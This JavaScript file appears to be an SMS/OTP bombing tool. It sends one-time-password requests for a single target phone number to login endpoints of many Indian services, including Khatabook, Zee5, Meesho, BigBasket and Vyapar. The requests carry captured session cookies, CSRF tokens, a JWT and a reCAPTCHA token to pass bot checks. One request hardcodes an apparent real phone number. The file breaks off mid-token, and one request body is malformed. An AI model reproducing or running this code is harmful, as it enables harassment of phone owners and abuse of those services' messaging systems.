let phone = 123;

function setPhone(newPhoneId) {
  phone = newPhoneId;
  console.log(`[apiServices] Internal phone variable updated to: ${phone}`);
}

const fetchKhatabook = () => {
  fetch("https://api.khatabook.com/v1/auth/request-otp", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-kb-app-locale": "en",
      "x-kb-app-name": "Khatabook Website",
      "x-kb-app-version": "000100",
      "x-kb-new-auth": "false",
      "x-kb-platform": "web",
      Referer: "https://khatabook.com/",
    },
    body: `{"country_code":"+91", "phone": "${phone}","app_signature":"Jc/Zu7qNqQ2"}`,
    method: "POST",
  });
};

const fetchZeeott = () => {
  fetch("https://auth.zee5.com/v1/user/sendotp", {
    headers: {
      accept: "application/json",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      device_id: "eef72d43-4fb1-4d18-8b0a-5b96896428b8",
      esk: "ZWVmNzJkNDMtNGZiMS00ZDE4LThiMGEtNWI5Njg5NjQyOGI4X19nQlFhWkxpTmRHTjlVc0NLWmFsb2doejl0OVN0V0xTRF9fMTc4NzU2ODcxOTgwMg==",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-z5-guest-token": "eef72d43-4fb1-4d18-8b0a-5b96896428b8",
      Referer: "https://www.zee5.com/",
    },
    body: `{"phoneno":" "91${phone}}"}`,
    method: "POST",
  });
};

const fetchDistrict = () => {
  fetch("https://www.district.in/gw/auth/generate_otp", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-app-type": "ed_web",
      "x-app-version": "11.11.1",
      "x-client-id": "district-web",
      "x-device-id": "38bb9d6a-b724-466e-89b5-7e93f4b0b14b",
      "x-guest-token": "1212",
      cookie:
        'AKA_A2=A; ak_bmsc=6F96DE2BFC5E1E6F49FD53602529E7BF~000000000000000000000000000000~YAAQztfSFyTjQTKgAQAA5aBuMwAJ+X0diacrsunZKWvDuGI8sbWKRk9T4Ko5ssmtS74wDUwIy/NottsVkNCAixYhF979hp4w8DWnKl+67CpgXlQUS9lWZbhIpSV2u7PEeso5lAf0FzufKJGkbFsWi/8xH5MeuS86ykKMw9E8didtrbz7iZoTxMqZgRuZNO8HQCmRahcs1msQcRj7rEHgApGl7kcfXoK5ksSizl32wfY5CUpFddLMgk0A9uy120mCZ3rSB+T3Sa0anGGNOYtALYeW3VSGe8P+1EM5ZxSYv3gnVU5fVtMt6+1NieUAa66DepKd2Nnjc/zFGSZh3nF+80F/CfD2TFWEdJsZkbr/74kb3akDvmruEYBWMX63KuAuqHJhxtcVx8fxFlDBnJ/enD4jaw==; x-device-id=38bb9d6a-b724-466e-89b5-7e93f4b0b14b; location=%7B%22fullname%22%3A%22International%20Tech%20Park%20Gurgaon%2CGolf%20Course%20Ext%20Rd%2C%20Alahawas%2C%20Sector%2059%2C%20Gurugram%2C%20Haryana%2C%20India%22%2C%22google_place_id%22%3A%22ChIJuyrrMJMhDTkRekt_0twP-C8%22%2C%22lat%22%3A28.4080424%2C%22long%22%3A77.1165992%2C%22subtitle%22%3A%22Haryana%22%2C%22title%22%3A%22Gurugram%22%2C%22id%22%3A1%2C%22cityId%22%3A1%2C%22cityName%22%3A%22Delhi%20NCR%22%2C%22pCityId%22%3A%2257%22%2C%22pCityKey%22%3A%22gurgaon%22%2C%22pCityName%22%3A%22Gurugram%22%2C%22pStateKey%22%3A%22haryana%22%2C%22pStateName%22%3A%22Haryana%22%2C%22countryId%22%3A%221%22%2C%22placeType%22%3A%22GOOGLE_PLACE%22%2C%22placeId%22%3A%22ChIJQ3GqXwAZDTkR2IGBwuLDcCk%22%2C%22subzoneId%22%3A%22645%22%2C%22countryKey%22%3A%22india%22%2C%22zoneId%22%3A%222%22%7D; userProfile=; WZRK_G=fb53d3a7959743828b59928d4b80dc25; _ga_WDEHDQ2ZK7=GS2.1.s1787569302$o1$g0$t1787569302$j60$l0$h1690906614; _ga=GA1.1.1114083309.1787569303; WZRK_S_846-Z94-RR7Z=%7B%22p%22%3A1%2C%22s%22%3A1787569302%2C%22t%22%3A1787569303%7D; _gcl_au=1.1.838220091.1787569302.-.-.1787569303.1614764677.1787569303.1787569303; _ga_KHRD29M2W7=GS2.1.s1787569303$o1$g0$t1787569303$j60$l0$h1423196165; bm_sv=1699FEDF0C90CB96F916AB9AA1F9EECE~YAAQHXBWuOM7hPqfAQAAaPluMwDDboaBdy6Ot4rh/BpoODevftFVSmomLgdZrYtuVF3uIDjVMQof6xv33jJAaHQg/NKgQ3n+h3nVNamDehEv8/yL0gGkUizYtH9K4E8gKXdby/1D8kAR520ZVVtIbpDiA1u/4+RmxFHErvRj4Lfh4PbX2vYb0wdcsfbGarMaz5SeJcwtfeCW5jtDbtutOJPvSfJYh1NRVVHZHxJ6vUKe6wFtKW8G6+cfei30EHW0oA==~1; RT="z=1&dm=www.district.in&si=97420dea-ebb0-4419-ab19-af19204fae83&ss=mt74lnb0&sl=1&tt=fmy&rl=1&ld=fn2"; _dd_s=aid=8fbf45db-db39-42a5-a78b-f13db43c0dde&rum=0&expire=1787570219552',
      Referer:
        "https://www.district.in/?srsltid=AfmBOoqVm3sxEUjQKxGO5j0f0dQ1OEMGJj9-yrvNz1jM-TrZJ92HgfZA",
    },
    body: `{"phone_number":"${phone}","country_code":"91"}`,
    method: "POST",
  });
};

const fetchAllen = () => {
  fetch(
    "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login",
    {
      headers: {
        accept: "application/json",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        baggage:
          "sentry-environment=production,sentry-release=20260821-135229,sentry-public_key=faf6a73a3042fbbe7094de5adeb3049e,sentry-trace_id=2bac78dd82314f78b0d81d668d1eae2d,sentry-sample_rate=0.05,sentry-sampled=false",
        "content-type": "application/json",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sentry-trace": "2bac78dd82314f78b0d81d668d1eae2d-ae3c14e2ee111cea-0",
        "x-client-type": "web",
        "x-device-id": "12917231-1242-46f4-9ce6-3d9d0f8e87e6",
        "x-referrer": "https://allen.in/",
        Referer: "https://allen.in/",
      },
      body: `{"country_code":"91","phone_number":"${phone}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}`,
      method: "POST",
    },
  );
};

const fetchHungama = async () => {
  const res = await fetch(
    "https://chcommunication.api.hungama.com/v1/communication/otp",
    {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        alang: "en",
        "content-type": "application/json",
        country_code: "IN",
        identifier: "home",
        mlang: "en",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        vlang: "en",
        Referer: "https://www.hungama.com/",
      },
      body: `{"mobileNo":"${phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}`,
      method: "POST",
    },
  );
};
const fetchPayme = () => {
  fetch("https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://www.paymeindia.in/",
    },
    body: `{"phone_number":"${phone}"}`,
    method: "POST",
  });
};
const fetchAstrosage = () => {
  fetch(
    `https://varta.astrosage.com/sdk/registerAS?callback=myCallback&regsource=AstroSage_Web&countrycode=91&phoneno=${phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1787572359518`,
    {
      headers: {
        accept: "*/*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-site",
        cookie:
          "_gcl_au=1.1.1866223187.1787572362; _ga_1C0W65RV19=GS2.1.s1787572361$o1$g0$t1787572361$j60$l0$h0; _gid=GA1.2.1564486803.1787572362; _gat_gtag_UA_245702_1=1; _ga_0VL2HF4X5B=GS2.1.s1787572362$o1$g0$t1787572362$j60$l0$h0; _ga=GA1.1.258420450.1787572362",
        Referer: "https://www.astrosage.com/",
      },
      body: null,
      method: "GET",
    },
  );
};
const fetchMeesho = async () => {
  const res = await fetch(
    "https://www.meesho.com/api/v1/user/login/request-otp",
    {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "meesho-iso-country-code": "IN",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        cookie:
          "ORDER_BLOCK_EXPERIMENT_COOKIE=0.94; ak_bmsc=A272152171113F6DE1C859BD06B62128~000000000000000000000000000000~YAAQDqwwF3hzjfefAQAA/gmhMwBlIeLL6Qp0yuU9mjzXmLThWMzg35b7q+v7lo2mX2tQeBwr2kpRwzir0NTYWXnbkiE4nRHV22ycoCqbtzjcy+OnOGdpxLTRg6kwtGyxsvvq9ZG62ZhfN5FVK+lgfM2DzgLf649ghN1mBAszKZGCaTF3JcdSGQ4Cra1rc0cpLXAQPNn/QIMAAn0WRS4yZHKrym3FA9g0GGJWr7vZvUO9ChW3T6X3xivoerLsI/tujwAPkcL0majh4X7ZHfN+xR9SaS1ishLl7IQAefHJYFzBE25FRB4TsE+3NRmVYe6pBN0cl0j7ul9r37NloFolLy2tss8+DHuMc6SJDtcWpwvk0YMCJ6dwVnaffoGz9Qtwj7VCRglHpmgpEASZcb7vCxbi; bm_sz=508C5CF78D6319C0DCFB5FD7FF27CF5B~YAAQVvEBF2UDRPSfAQAANRKhMwC+uP2P8Xqr11aYp0h5/OwgQRNxZh2gILQ9+1KhuVguLIzxeRuKKd9YtSjk42QC1HvsEp2A24Ymtaa7fyKfMoJjC2pzBOoSnID7d6QbwvVtLNJviapk2P2B7kGmp8tOxivjpU0pJyxDcrMAmolPg7r9Q+//AawVC7IsdJJOVGGHYnU9nGKwkeFhNMr7T0A+yJrdfiIRUYZOI4NmmlLYp1sMsicKqDBX4QP/IK4oZ3a2Y4rpcBNLzHSo0Hd+KGvIJZRdQ08SNaa59Z7+XM3gpSDfllhfPdbDHcVwXB5+vvnv2P5JBnyILUFL7S432l4tfe7bLyKzF6xrIV2wQeGK7xmRkxfiuTPyYI6t4XRjFBTfsyo065bZCqF+JrETemtEjvtz2EU=~3290681~3555651; bm_s=YAAQVvEBF2kFRPSfAQAASRqhMwUq8B4fzWgO3EphnC3kFjc7GWYptGuaXCQFkvXgmHBfHVGs7Dg32UFEbEcQYHASiSgoI4GC1kWwWSkLVU+/+brD/Qjw4FsH2oQullXqNRiuod8foc39uTRiYaLk/4zf5ZlV3i0FNtHAIfl3Rak0ZWFhto6Zs/Hh7/RMm0CsJqTp5927dKjx/2qx0T/puhNzcpTytIl7am+hWH657QE3Ba1WGlGHtMJh6KZ5Qd8FWm9ad0Gw6afoNViqThZCbes/IcrxSaMkfsKKr9cAubb9H4GKG8QiBWm7/dNv/dwekmP/YS0stcQzxuostX06mlSvc6watzCWlZtN5v2h6SNUjKGKYCp1vvIOe/0wkp8CAkjWhr2KWNWbbPCAeKTecO3n2AJR4bwxit0EXMWwpd5PUrv3O8zVwrZ83d3g0NHaJpvsuRTzB6UMebDtrp0YolDDKvw/JhIyBH9mdIPQNfoCQE6xn9jdixqOoDWawPiw2gD5BlnRD2D0H0T0cldoQ0ufTNuufMi9oZq0edS3CUA094EDdh3793o2V6Y4E2yymhLH3X+tKfHRMot1fSIACReivFg/d0UInnz1qrCnCQsk1Yv6SC9TNEsg0nDv0TFuSIIMv44GbeuOPkzyUHjPr7/KOWgtTkwPZDsjoNc2YOHqUHetqNG6HpWOrMqrxtPQXuuOFlw/rm5v0RkuKr/2rfWfYuaIXaGfoB1Yfl40hbbBGDHRMXRBqC1T1Fg/v/tL1HlFLsikp7ta8XCIglDPfMctWuNzYyU63APPFJoBH5Sa8SQKdM06hHANRI9X9Q9aYq4OW3dJk0Oa7/V0CJkBaFfXLUUEb/7RQydPaZCZrrGLwQkTr8YonaaKsDjlsquHCRN9y+haOPRn7n9Purs=; bm_sc=1~2~25928109~YAAQVvEBF2oFRPSfAQAASRqhMwnpc2kI5usAxiMOxtLOYcYwTlFpPLCnQo8VYXB+/Cr0qidvfrpiHLMXkCeGMTBhpegrvJd+lgMgFXXWDxuQQuCfBgRpJCygddhGEgPGH+4/0Clt3Dkoe9+YTyrX+00f/Z9JkqWevHgGOWBRyzNPi+lN+/YzovaO6XnptqxA4YQgIm6aFU2L0TRQLjQduVPxaKSU04Xn5QJIqIXATqiPAp7P5zgY5U1lG9Hm3keoPR9Kjz9lCrF7YuwfeB/7Cj3oGPR4EPV1XleW/ClG5Ua+SAEEtHUONCbzfi35xc2B2QjaM+YjFSQYrZAh9Kzvk2A/8yJ6+HAm14sCuLVIEeorjYMgCdAbUqg0thUqEFeZxe6PxllaiF4B1JJvFwoq9rFFqgVAjQtwYJ3wVjAT3lOurFaiaTWNvZMKwsB2b6eXXoySnV1qF77aV7rMZLHY9ofGUpnKEctvSwXxbw17stKEJyOWO77erJQWoRx9iLkBpbyjP1h5nDMX~0~0~0; bm_so=B14ECAD950C61E66C0EF7F1C64233E0201DF9D1803D2DDEA1E5282C5273489B0~YAAQVvEBF2sFRPSfAQAASRqhMwgh1xLy3g2d6HD7VK747bv3NjufrmDj074fKQCXwT3ljI3d2agtZerwtd7E39oa/btChWlUbaDxOB+RZGwcCmUeUS2B12X0RiPkUW22krGEyJBVHaIfJezuyxI/S6Jpr5eJkzh6bp0gncpewyyYxzaMv6xlWVjba+SYFAmDgxcwM2SfF2CSTx91jQillvkWxNMA1nEuXWscVeee2L/2y9c6WzZlo9RLr75tV+uGe8ypC6xeYezC7nntgAnWrp4gObu5q/4lu63Ts2mzLI5Eeb2W1SHHM9/GOc4QZO6qiHInwAS8GWERpVcdd1z4SiCPuVYING9ox/Qo0C3ECw7qnoFe2fxU4l+q1Aqi6ayR1zOGIjDKlnyJBmLQ7MgWiHVYNxDqMwmILH1SNpwpOhXbGjA+vxvQ9In0+x1BcOArOv3j1PyJXJCINQrUYUZ+avA=; _gcl_au=1.1.865303616.1787572592; _ga=GA1.1.1611940418.1787572592; _ga_NEH2MEG9CT=GS2.1.s1787572592$o1$g0$t1787572592$j60$l0$h0; bm_sv=FE09330F155562B7463E78265B688D57~YAAQVvEBFwwgRPSfAQAAQWChMwB83ig2KPQqXmHcJgScYy1FdSA+eZlcwtFPzYBs/o6X5XgLTcoFmlZDOSX5UZkZ0/Tk91mdFF8hVAXAweqz/dBV+SjjiNNafZegNBcEcacgEFhCSsjInu/Jr0joe5K3pAuc48volXpUJ+fLYEs0+ZaF6sUwHXIQvcHqDlOcHUVLyQ0cPEcDNapMrXhjxp/R6DwN20eyyTufVokrYhG5QCtNhMeSNNapKB0l3Eiy~1; _abck=4CC0FB27C4A273FD18DD3A46396CFCE4~0~YAAQVvEBFzMgRPSfAQAAp2ChMxDOqQgj7FSdOESVmVp1Y1jJbtbxvaRDnUKWo3XcxmuAzbdfpTPHmaJ+wPgO0XcXPUJ/ZGZdB9/vks+AeSaDCk6QXN+/+wyZyO1dTeoEI+LHJQxQWTBYKqjoxKQ1Bx3BaGNPMppVLQ1rQ4eLMzn9no90ma6S2nc/ktJj8yP4eMpzQuZnRFgvBmPt11E2VGsv05BQeuOM2S2uyO0Ub3x/7o34piaiUn994mrooWp4JCktOEFs2bW8eoi8kM5ITBRQY+UY5od22Hx5OPBv9NAZy724OzndBMkyvJH8VYXnrpYA1EzQHQXXzDet6it49E6MRlovj+afnulGEHG7JYSLkPo7zUOUKX5Nt4foqkiEBebI8N9cHn5UIZ5mm2RamCMkSyF4hf8RqgKbE/F1B1dT9IsXnnAE/2lrAyGrTm3sGhuK2LvMWhBMpA87wBOTWt1Y+yASQqZl8BOksWQOdKPM70G7l/Yy0d/z6XP4UOogIuEcK12cTqL4YsNBeaYhNAVQNOe3+XzWn1T0HGy/mL8i7mN/Fsrzu9NaDWEoAJnkM7hU/DgGYjcQPr19YBts+4OBTqaqFEJrHmJmF7AuoBWHegNggYA0XeeB3bJdbThJZvP4o/9ibd+T3B9/+/afnQHfWOxPKVm3lIitvTc5uulw6JPHfsqK+Q==~-1~-1~1787576189~AAQAAAAG%2f%2f%2f%2f%2f0403FQUU+Kz6XGw4pT+SDyCPMyz+dRhdEzEbCm3lkXiXOrusm3tfvJGXuNjs0QYuWoJ9vt8rX5m91Q9t8izFGm%2f+m9Qv1lfWEM+~-1; mp_60483c180bee99d71ee5c084d7bb9d20_mixpanel=%7B%22distinct_id%22%3A%20%221a033a1160c2ca-0d441f088a9aa6-26071851-100200-1a033a1160d5a6%22%2C%22%24device_id%22%3A%20%221a033a1160c2ca-0d441f088a9aa6-26071851-100200-1a033a1160d5a6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22%24user_id%22%3A%20%221a033a1160c2ca-0d441f088a9aa6-26071851-100200-1a033a1160d5a6%22%2C%22Is%20Anonymous%22%3A%20%22True%22%2C%22Session%20ID%22%3A%20%226723d10c-0c9a-4bc3-8f15-ebc05913%22%2C%22last%20event%20time%22%3A%201787572610642%7D",
        Referer:
          "https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F&source=profile&entry=header&screen=HP",
      },
      body: `{"phone_number":"${phone}"}`,
      method: "POST",
    },
  );
  // console.log(res);
};
const fetchMama = async () => {
  const res = await fetch("https://gkx.gokwik.co/v4/auth/otp/login/trigger", {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      authorization:
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc4NzU3MjgxOCwiZXhwIjoxNzg3NTcyODc4fQ._cBt8ESylvxXNzRPMDzGp_ep6FYTBpvHs8dxMZriGx4",
      "content-type": "application/json",
      "gk-merchant-id": "3qnl4ximmh2fvvh",
      "gk-platform": "shopify",
      "gk-request-id": "acc134f4-287c-49b4-949a-49661fbb9132",
      "gk-signature": "794325",
      "gk-source": "kp",
      "gk-timestamp": "59585760",
      "gk-udf-1": "367",
      "gk-version": "20260820165316032",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-origin": "https://pdp.gokwik.co",
      Referer: "https://pdp.gokwik.co/",
    },
    body: `{"phone":"${phone}","country":"IN"}`,
    method: "POST",
  });
  const data = await res.json();

  // console.log(res); // This will print the actual API response
};

const fetchVyapar = async () => {
  fetch(`https://vyaparapp.in/resend/otp?email=${phone}&country_code=91`, {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-arch": '"x86"',
      "sec-ch-ua-bitness": '"64"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-ua-platform-version": '"10.0.0"',
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-requested-with": "XMLHttpRequest",
      cookie:
        "PHPSESSID=5ahe52ero2ntveu121d0namg47; country_state_code=%7B%22country_id%22%3A98%2C%22state_id%22%3A27%2C%22calling_code%22%3A%22IN%22%7D; _vwo_uuid_v2=D6E5F91537CB746FD5DB3CD699BA1FEDC|ba237dc63d035c13f048dfb63703fa5f; _vwo_uuid=D6E5F91537CB746FD5DB3CD699BA1FEDC; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vis_opt_exp_688_combi=2; _vwo_ds=3%3At_0%2Ca_0%3A0%241787651821%3A42.72980333%3A%3A%3A%3A2%2C%3A1787651821%3A1787651821%3A1%3A688_1787651824; nitrox=3c67fa0f-ebc8-4eff-9879-0aefb9933054; _gcl_gs=2.1.k1$i1787651819$u6564533; biscuit-id=biscuit_f757cf5b-99cb-49aa-ac50-72c7be47651e; _gcl_aw=GCL.1787651830.CjwKCAjw-rTUBhAiEiwADv8gBF-KCEkE7lFUACs2-sgkgH3ONi7cIFuB5cTJo0_GtnNYCcc8NHEHgBoCCPMQAvD_BwE; _ga=GA1.2.2132501839.1787651826; _gid=GA1.2.1928319733.1787651836; _gat_UA-99219048-1=1; _gcl_au=1.1.203041244.1787651826.-.-.1787651825.17792891.1787651826.1787651841; _ga_M5XD3V5FGE=GS2.1.s1787651825$o1$g1$t1787651841$j44$l0$h0; _uetsid=54452a40a06b11f19ccc31fe9c9f06e2|5210ht|2|g8w|0|2428; _uetvid=54456e10a06b11f1ab34c567fbfc8c9f|dv78ad|1787651827193|1|1|bat.bing.com/p/insights/c/j; XSRF-TOKEN=eyJpdiI6IlZaNmU5YndLMnRzR3RnRHNudlVOZFE9PSIsInZhbHVlIjoiTE1ucWtOY25ESnZHWkRMXC9Fd0drcitxTEZ3UG45Q3I0WndcL2xKXC9keGtDTTU5RkJuNDc3aTl0bEtsaGltSlBmUHhQNGJFNjJZQ0JTXC8xODhiTFNiZmJ3PT0iLCJtYWMiOiJmOWU2MzMxZTE1ZjdkMDI1Yzk0OWY4MDhmZTk3ZGFlYzY2Zjg2MDY3OGZjZThmY2ViNDIxZjFiZDEwNWFmOGVjIn0%3D; laravel_session=eyJpdiI6Ik1pSTdRNEptWEJmOXRra0R6V1FwSWc9PSIsInZhbHVlIjoiY0grYVJ1aG9nRFg5QU5qZlpqSEdNdzRYSlpzMlB3Q0ozM3dvMXdVelwvd0VvOTNRQlNuXC9WYjR2bWJSekFvMnNqaVlNcDVabGcyWnpkK2g4aDNZMVJBQT09IiwibWFjIjoiNzA3NjM0YjMzZDM5ZTc5MmRhZjExODYzNWIzMDFiNTY0Y2M0MTNlYWQ3YmYzMDY3NWQ2YWVhNGU1NWUzMzIxNyJ9; _vwo_sn=0%3A1%3A%3A%3A1%3A%3A%3A1787651870539; _gac_UA-99219048-1=1.1787651872.CjwKCAjw-rTUBhAiEiwADv8gBF-KCEkE7lFUACs2-sgkgH3ONi7cIFuB5cTJo0_GtnNYCcc8NHEHgBoCCPMQAvD_BwE",
      Referer:
        "https://vyaparapp.in/?campaign_id=GBASTATE&adgroupid=177064402224&creative=720799890220&keyword=vyapar&targetid=kwd-391056922771&placement=&adposition=&g=g&device=c&devicemodel=&matchtype=b&loc_physical_ms=1007765&gclid=CjwKCAjw-rTUBhAiEiwADv8gBF-KCEkE7lFUACs2-sgkgH3ONi7cIFuB5cTJo0_GtnNYCcc8NHEHgBoCCPMQAvD_BwE&gad_source=1&gad_campaignid=21896874689&gbraid=0AAAAADf2IqZgsO0wnEKBtb1bITELyWvbj&gclid=CjwKCAjw-rTUBhAiEiwADv8gBF-KCEkE7lFUACs2-sgkgH3ONi7cIFuB5cTJo0_GtnNYCcc8NHEHgBoCCPMQAvD_BwE",
    },
    body: null,
    method: "GET",
  });
};

const fetchBB = async () => {
  fetch("https://www.bigbasket.com/member-tdl/v3/member/otp", {
    headers: {
      accept: "application/json",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "referring-client": "https://www.bigbasket.com",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-caller": "Monster-SVC",
      "x-channel": "BB-PWA",
      "x-csrftoken":
        "HjM1QV0fDz23BOHmMD9r6lEtrx838cgc7z7djXUPdwbS0X1SZRjPtIMfkvSpIKPD",
      "x-csurftoken":
        "yNGIXA.MTQwMjMyMDU2MzI2NjE3OTA1NA==.1787652021350.6J1o67q1P4a4Vd2Ld0ZirajQmunceS9S5p6Nete2WqI=",
      "x-entry-context": "bbnow",
      "x-entry-context-id": "10",
      "x-timestamp": "1787652069",
      "x-tracker": "b37b5a36-8e03-4f16-ad41-0f3163334d3b",
      cookie:
        "jarvis-id=df4d3722-5dc8-4b4a-a1be-360dec57d6c3; _bb_locSrc=default; x-channel=web; _bb_aid=MjkxMzA4NDUzMA==; _bb_cid=1; _bb_vid=MTQwMjMyMDU2MzI2NjE3OTA1NA==; _bb_nhid=7427; _bb_dsid=7427; _bb_dsevid=7427; _bb_bhid=; _bb_loid=; csrftoken=HjM1QV0fDz23BOHmMD9r6lEtrx838cgc7z7djXUPdwbS0X1SZRjPtIMfkvSpIKPD; isintegratedsa=true; jentrycontextid=10; xentrycontextid=10; xentrycontext=bbnow; _bb_bb2.0=1; is_global=1; _bb_addressinfo=; _bb_pin_code=; _bb_sa_ids=19224; _is_tobacco_enabled=1; _is_bb1.0_supported=0; _bb_cda_sa_info=djIuY2RhX3NhLjEwLjE5MjI0; is_integrated_sa=1; is_subscribe_sa=0; _bb_member_class=; bb2_enabled=true; csurftoken=yNGIXA.MTQwMjMyMDU2MzI2NjE3OTA1NA==.1787652021350.6J1o67q1P4a4Vd2Ld0ZirajQmunceS9S5p6Nete2WqI=; bigbasket.com=06385e24-7b79-4cb1-be3e-cfa60b613f73; ufi=1; _gcl_au=1.1.1361355808.1787652022; _gid=GA1.2.37710666.1787652023; _gat_UA-27455376-1=1; _ga=GA1.1.686769037.1787652023; _ga_FRRYG5VKHX=GS2.1.s1787652023$o1$g0$t1787652023$j60$l0$h0; adb=0; ts=2026-08-25%2015:30:34.163",
    },
    body: '{"identifier":"9811363533","referrer":"unified_login","recaptchaToken":"0cAFcWeA6I4q6fmCXa08INEVmc0nhRXGes3cYFDlZQd9NgcNcT_eJqpcPFJoCJVFmT3UEZauYEePRLt3ymDb0eOKhRaLYazWeM8lwqZw43hn8eXAfTZz2OmGw5-GZwhxWKvBkqkcCjswwQHPrwjJKIj9jH7hIXwex5EjJg8XOgLYKs2yWF20QpXUqvHOMxS82_2xlSAlSqbNtotbvi4VbO356ffAfYLNwnXme8-8cQ8SGPO2VivfGGePD2eevOCvWJ90J_DRuOYLOHNU5M4Oh9fqkUntts7dsTx9i_nFk2w4JmizsbzZKX0FVDBot5CwFJBKq4B09Z2fBi1twbkZhDyPKN9lH4I2g3I2pnTzUP1z4Mnjkwz7Hzid3XTYzYlprZNv4kL_WHepLIF52-GPWL_Y5Gsaf9ToMbaLZ91MW6amHe0VjeZ5QZggf4P4Wo0kNItsv0QRPS85ZzYJP0ElCNKhPp3bvLqSpDb5NjOcNnIi1IwLz5HmTuO_FOY_cXT3qeqBWwtApDx1MkVHb_aaX7QtJq-3c93Q00toXReDt-uMyzir867elwvLSxUgRnmjx9gsl8V9tjnNDRQuHUx8V-z2bJ0aTVeoSS08OJHk821sg5aaplEQKp7k-69VmK57j_xXLJsJzJ_zxLyIv39-l9sXxtydrBSsB6d35ADPZE8_K9oODNhOt7LtOa8hX8kwfn2LmIMFcGXOolazbpqaCvfFHBirtjKFXB_bva0m4jX1msasup_s8POP8gB7rb0jrPecFOGKmJpnoxpc9DDW03bq0zG3IRXWchKScYkE9fWe53j6WV6zgHFZvStx0ehEb9U6M6Eo3R